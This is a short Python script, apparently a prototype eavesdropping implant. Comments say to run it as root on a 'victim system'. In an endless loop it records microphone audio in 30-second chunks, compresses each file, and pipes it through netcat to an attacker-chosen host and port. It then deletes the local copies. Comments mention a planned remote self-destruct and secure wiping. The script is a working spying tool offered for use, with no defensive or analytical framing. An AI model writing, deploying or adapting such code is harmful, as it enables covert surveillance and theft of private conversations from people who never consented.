#!/usr/bin/python3
#coding: utf-8
__version__ = "v0.1.0(prototype)"
# Note: use that with root user of the victim system.
import sounddevice as sd
from scipy.io.wavfile import write
from os import system
import gzip
def compress_file(filepath,lvl=9):
    with open(filepath,"rb") as fin:
        data = fin.read()
        fin.close()
    with open(filepath+".gz","wb") as fout:
        fout.write(gzip.compress(data,compresslevel=lvl))
        fout.close()
    return filepath + ".gz" 
compression = True
compression_level = 9

# encryption = True
# encryption_key = ""

erase_custom_command = "rm -f {file}" # alse u can use this other exemple "wipe -rf -S r -T 15 {file}"

# For the remote of the self-destruction feature
# use the command `sha512sum <file>` and copy the hashed value to paste into this string value
# autodestructive_hashed_key = ""


fs = 44100  # Sample rate
seconds = 30  # Duration of recording
while True:
    IP_HOST, PORT_HOST = "", "" # change this two Vars to set the destination of the outbound connection by the infected victim to your attack relay point. the connection for transmit the audio records use TCP connections.
    myrecording = sd.rec(int(seconds * fs), samplerate=fs, channels=2)
    sd.wait()  # Wait until recording is finished
    audio_filepath = '/tmp/i-have-hack-your-mic.wav'
    write(audio_filepath, fs, myrecording)  # Save as WAV file 
    if compression:
        out_filepath = compress_file(audio_filepath,lvl=compression_level)
        system(erase_custom_command.format(file=audio_filepath))
    system("netcat "+IP_HOST+" "+PORT_HOST+" < "+out_filepath)
    system(erase_custom_command.format(file=out_filepath))